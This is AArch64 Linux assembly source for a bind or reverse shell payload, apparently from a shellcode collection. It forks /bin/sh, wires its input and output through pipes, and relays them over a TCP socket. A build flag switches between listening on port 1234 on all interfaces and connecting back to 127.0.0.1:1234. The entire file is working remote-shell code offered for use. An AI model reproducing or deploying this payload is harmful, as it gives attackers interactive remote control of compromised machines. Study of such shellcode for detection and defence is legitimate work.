 /**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
      .arch armv8-a
      .align 4

      // comment out for a reverse connecting shell
      .equ BIND, 1

      // comment out for code to behave as a function
      .equ EXIT, 1

      .include "include.inc"
      
      // structure for stack variables

              .struct 0
      p_in:   .skip 8
              .equ in0, p_in + 0
              .equ in1, p_in + 4
          
      p_out:  .skip 8
              .equ out0, p_out + 0
              .equ out1, p_out + 4
          
      id:     .skip 4
      s:      .skip 4

      .ifdef BIND
        s2:   .skip 4
      .endif

      efd:    .skip 4
      evts:   .skip 16
              .equ events, evts + 0
              .equ data_fd,evts + 8
          
      buf:    .skip BUFSIZ
      ds_tbl_size:

      .global _start
      .text
_start:
      // allocate memory for variables
      sub     sp, sp, #ds_tbl_size

      // create pipes for stdin
      // pipe2(in, 0);
      mov     x8, #SYS_pipe2
      mov     x1, xzr
      add     x0, sp, #p_in
      svc     0

      // create pipes for stdout + stderr
      // pipe2(out, 0);
      add     x0, sp, #p_out
      svc     0

      // syscall(SYS_gettid);
      mov     x8, #SYS_gettid
      svc     0
      str     w0, [sp, #id]
      
      mov     x8, #SYS_clone
      add     x4, sp, #id          // ctid
      mov     x3, xzr              // newtls
      mov     x2, xzr              // ptid
      mov     x1, xzr              // child_stack
      mov     x0, 0x11             // flags
      movk    x0, 0x120, lsl #16   //
      svc     0
      str     w0, [sp, #id]        // save id
      cbnz    w0, opn_con          // already forked?

      // in this order..
      //
      // dup3 (out[1], STDERR_FILENO, 0);      
      // dup3 (out[1], STDOUT_FILENO, 0);
      // dup3 (in[0],  STDIN_FILENO , 0);
      mov     x8, #SYS_dup3
      mov     x1, #(STDERR_FILENO + 1)
      mov     x2, xzr
      ldr     w3, [sp, #in0]
      ldr     w4, [sp, #out1]      
c_dup:
      subs    x1, x1, #1
      // w0 = (x1 == 0) ? in[0] : out[1];
      csel    w0, w3, w4, eq  
      svc     0
      cbnz    x1, c_dup

      // close pipe handles in this order..
      //
      // close(in[0]);
      // close(in[1]);
      // close(out[0]);
      // close(out[1]);
      mov     x1, #4*4
      mov     x8, #SYS_close
cls_pipe:
      sub     x1, x1, #4
      ldr     w0, [sp, x1]
      svc     0
      cbnz    x1, cls_pipe
      
      // execve("/bin/sh", NULL, NULL);
      mov     x8, #SYS_execve
      mov     x2, xzr 
      mov     x1, xzr 
      adr     x0, sh 
      svc     0
opn_con:
      // close(in[0]);
      mov     x8, #SYS_close
      ldr     w0, [sp, #in0]    
      svc     0

      // close(out[1]);
      ldr     w0, [sp, #out1]    
      svc     0
     
      // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
      mov     x8, #SYS_socket
      mov     x2, #IPPROTO_IP
      mov     x1, #SOCK_STREAM
      mov     x0, #AF_INET
      svc     0
      
      mov     x2, #16      // x2 = sizeof(sin)
      adr     x1, sin      // x1 = &sin
      str     w0, [sp, #s] // w0 = s
.ifdef BIND  
      // bind (s, &sin, sizeof(sin));   
      mov     x8, #SYS_bind
      svc     0
      cbnz    x0, cls_sck  // if(x0 != 0) goto cls_sck

      // listen (s, 1);
      mov     x8, #SYS_listen
      mov     x1, #1
      ldr     w0, [sp, #s]
      svc     0

      // accept (s, 0, 0);
      mov     x8, #SYS_accept
      mov     x2, xzr
      mov     x1, xzr
      ldr     w0, [sp, #s]
      svc     0
      
      ldr     w1, [sp, #s]      // load binding socket
      str     w0, [sp, #s]      // save peer socket as s
      str     w1, [sp, #s2]     // save binding socket as s2
.else
      // connect (s, &sa, sizeof(sa)); 
      mov     x8, #SYS_connect
      svc     0  
      cbnz    x0, cls_sck        // if(x0 != 0) goto cls_sck
.endif 
      // efd = epoll_create1(0);
      mov     x8, #SYS_epoll_create1
      mov     x0, xzr
      svc     0
      str     w0, [sp, #efd]
 
      ldr     w2, [sp, #s]        // add socket first
      ldr     w4, [sp, #out0]
poll_init:
      // epoll_ctl(efd, EPOLL_CTL_ADD, fd, &evts);
      mov     x8, #SYS_epoll_ctl
      mov     x3, #EPOLLIN
      str     x3, [sp, #events]   // evts.events = EPOLLIN
      str     w2, [sp, #data_fd]  
      add     x3, sp, #evts       // x3 = &evts
      mov     x1, #EPOLL_CTL_ADD  // x1 = EPOLL_CTL_ADD
      ldr     w0, [sp, #efd]      // w0 = efd
      svc     0
      cmp     w2, w4
      mov     w2, w4
      bne     poll_init
      // now loop until user exits or some other error      
poll_wait:
      // epoll_pwait(efd, &evts, 1, -1, NULL);
      mov     x8, #SYS_epoll_pwait
      mov     x4, xzr              // sigmask   = NULL
      mov     x3, #-1              // timeout   = -1
      mov     x2, #1               // maxevents = 1
      add     x1, sp, #evts        // *events   = &evts
      ldr     w0, [sp, #efd]       // epfd      = efd
      svc     0
      
      // if (r <= 0) break;
      tst     x0, x0
      ble     cls_efd
      
      // if (!(evts.events & EPOLLIN)) break;
      ldr     w0, [sp, #events]
      tbz     w0, #0, cls_efd

      ldr     x0, [sp, #data_fd]
      ldr     w3, [sp, #s]
      ldr     w4, [sp, #out0]
      ldr     w5, [sp, #in1]

      cmp     w0, w3
      // r = (fd == s) ? s : out[0];
      csel    w0, w3, w4, eq 
      // w = (fd == s) ? in[1] : s;
      csel    w3, w5, w3, eq
      
      // read(r, buf, BUFSIZ);
      mov     x8, #SYS_read
      mov     x2, #BUFSIZ
      add     x1, sp, #buf
      svc     0
      
      // encrypt/decrypt buffer
      
      // write(w, buf, len);
      mov     x8, #SYS_write
      mov     w2, w0
      mov     w0, w3
      svc     0
      b       poll_wait
cls_efd:   
      // epoll_ctl(efd, EPOLL_CTL_DEL, s, NULL);
      mov     x8, #SYS_epoll_ctl
      mov     x3, xzr
      ldr     w2, [sp, #s]
      mov     x1, #EPOLL_CTL_DEL
      ldr     w0, [sp, #efd]
      svc     0
    
      // epoll_ctl(efd, EPOLL_CTL_DEL, out[0], NULL);
      ldr     w2, [sp, #out0]
      ldr     w0, [sp, #efd]
      svc     0
      
      // close(efd);
      mov     x8, #SYS_close
      ldr     w0, [sp, #efd]
      svc     0
cls_sck:
      // shutdown(s, SHUT_RDWR);
      mov     x8, #SYS_shutdown
      mov     x1, #SHUT_RDWR
      ldr     w0, [sp, #s]
      svc     0
      
      // close(s);
      mov     x8, #SYS_close
      ldr     w0, [sp, #s]
      svc     0
    
.ifdef BIND
      // close(s2);
      mov     x8, #SYS_close
      ldr     w0, [sp, #s2]
      svc     0
.endif            
      // kill(pid, SIGCHLD);
      mov     x8, #SYS_kill
      mov     x1, #SIGCHLD
      ldr     w0, [sp, #id]
      svc     0

      // close(in[1]);
      mov     x8, #SYS_close
      ldr     w0, [sp, #in1]
      svc     0  

      // close(out[0]);
      mov     x8, #SYS_close
      ldr     w0, [sp, #out0]
      svc     0
      
.ifdef EXIT
      // exit(0);
      mov     x8, #SYS_exit
      svc     0 
.else
      // deallocate stack
      add     sp, #ds_tbl_size
      ret
.endif

sh:
      .asciz "/bin/sh"
sin:
      .hword 0x0002     // sin.sin_family = AF_INET
      .hword 0xd204     // sin.sin_port   = htons("1234")
.ifdef BIND
      .word  0x00000000 // sin.sin_addr   = INADDR_ANY
.else
      .word  0x0100007f // sin.sin_addr   = inet_addr("127.0.0.1")
.endif